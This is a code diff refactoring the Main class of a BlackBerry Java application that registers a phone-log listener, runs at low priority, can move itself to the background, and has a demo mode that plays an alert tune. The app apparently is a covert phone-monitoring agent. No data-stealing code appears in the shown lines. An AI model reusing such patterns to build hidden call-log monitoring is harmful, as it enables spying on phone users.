@@ -12,12 +12,11 @@ package blackberry;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
 import net.rim.device.api.system.Alert;
 import net.rim.device.api.ui.UiApplication;
-import blackberry.config.Conf;
+import blackberry.config.Cfg;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.screen.BlackScreen;
 
 /**
  * The Class Main.
@@ -70,10 +69,10 @@ public class Main extends UiApplication {
      * Instantiates a new main.
      */
     public Main() {
-        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
-
-        appListener = AppListener.getInstance();
         final Core core = Core.getInstance();
+
+        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
+        appListener = AppListener.getInstance();
 
         //#ifdef DEBUG
         debug = new Debug("Main", DebugLevel.VERBOSE);
@@ -86,19 +85,23 @@ public class Main extends UiApplication {
 
         startListeners();
 
-        //#ifdef DEMO
-        short[] fire = { 1400, 15, 1350, 15, 1320, 20, 1300, 20, 1250, 25,
-                1200, 35 , 1200, 15, 1250, 15, 1300, 20, 1320, 20, 1350, 25,
-                1400, 35 };
-        try
-        {
-            Alert.startAudio(fire, 100);
+        if (Keys.getInstance().isDemo()) {
+            Status.self().setDemo(true);
         }
-        catch (Exception e)
-        {
-            
-        }
+        //#ifdef DEBUG
+        Status.self().setDebug(true);
         //#endif
+
+        if (Status.self().isDemo()) {
+            short[] fire = { 1400, 15, 1350, 15, 1320, 20, 1300, 20, 1250, 25,
+                    1200, 35, 1200, 15, 1250, 15, 1300, 20, 1320, 20, 1350, 25,
+                    1400, 35 };
+            try {
+                Alert.startAudio(fire, 100);
+            } catch (Exception e) {
+
+            }
+        }
     }
 
     /**
@@ -117,7 +120,7 @@ public class Main extends UiApplication {
 
         //addRadioListener(appListener);
         PhoneLogs.addListener(appListener);
-        
+
         Task.getInstance().resumeApplicationTimer();
 
         //goBackground();
@@ -155,7 +158,7 @@ public class Main extends UiApplication {
 
     }
 
-    public void showBlackScreen(boolean value) {
+   /* public void showBlackScreen(boolean value) {
         //#ifdef DEBUG
         debug.trace("showBlackScreen: " + value);
         //#endif
@@ -177,11 +180,10 @@ public class Main extends UiApplication {
                 //goBackground();
             }
         }
-
-    }
+    }*/
 
     public void goBackground() {
-        if (!Conf.IS_UI) {
+        if (!Cfg.IS_UI) {
             return;
         }
 
